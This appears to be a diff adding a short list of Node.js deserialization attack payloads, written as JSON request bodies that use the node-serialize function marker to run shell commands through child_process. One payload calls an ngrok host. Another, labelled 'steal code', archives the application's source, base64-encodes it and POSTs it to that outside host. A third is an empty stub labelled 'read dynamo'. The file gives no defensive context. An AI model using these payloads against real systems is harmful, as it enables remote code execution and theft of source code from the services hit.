@@ -1,0 +1,13 @@
+1 (test):
+'{"text":"hello", "user":"function(){require(\"child_process\").exec(\"curl http://07cf3049.ngrok.io\",function(error,stdout,stderr){console.log(stdout)});}()"}'
+
+
+2 (steal code):
+'{"text":"hello", "user":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"tar -pcvzf /tmp/source.tar.gz ./; b=`base64 --wrap=0 /tmp/source.tar.gz`; curl -X POST http://07cf3049.ngrok.io/hack --data $b\",function(error,stdout,stderr){console.log(stdout)});}()"}'
+
+
+3 (read dynamo):
+'{"text":"hello", "user":"_$$ND_FUNC$$_function(){}()"}'
+
+
+
